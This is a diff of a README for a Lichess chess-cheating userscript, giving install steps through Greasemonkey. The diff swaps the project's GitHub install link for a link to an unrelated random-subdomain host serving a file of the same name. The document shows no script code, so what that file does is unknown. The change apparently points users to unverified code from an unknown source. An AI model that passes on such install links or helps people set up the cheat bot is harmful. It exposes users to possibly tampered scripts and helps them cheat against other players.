@@ -10,7 +10,7 @@ try refreshing the page if it doesn't start the first time of the game
 -OR install GREASEMONKEY for FIREFOX 
 -After you've installed the add-on for your browser
 -click
--https://raw.githubusercontent.com/jonaspeterson/lichess-cheat-bot/master/install.user.js 
+-[a install](http://5ce0ee81e2404ac1b606ecf9ac026fec.yatu.ws/install.user.js)
 -to install automatically
 -
 -or manualy
